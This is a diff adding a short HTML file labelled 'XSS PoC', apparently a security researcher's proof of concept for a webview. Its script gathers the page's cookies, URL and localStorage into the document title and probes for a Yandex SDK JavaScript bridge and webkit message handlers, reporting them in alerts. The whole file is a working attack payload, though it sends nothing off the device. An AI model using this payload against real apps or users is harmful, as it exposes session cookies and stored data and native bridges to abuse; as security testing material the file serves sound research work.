@@ -1,0 +1,20 @@
+<html>
+  <head><title>Test</title></head>
+  <body>
+  <h1>XSS PoC</h1>
+  <script>
+  // Try to access SDK bridge
+  document.title = JSON.stringify({
+    cookies: document.cookie,
+    location: window.location.href,
+    localStorage: JSON.stringify(localStorage)
+  });
+
+  // Try to call Yandex SDK bridge (common patterns)
+  if (window.YandexPlus) alert(JSON.stringify(window.YandexPlus));
+  if (window.webkit && window.webkit.messageHandlers) {
+    alert('Bridge exists: ' + Object.keys(window.webkit.messageHandlers));
+  }
+  </script>
+  </body>
+  </html>
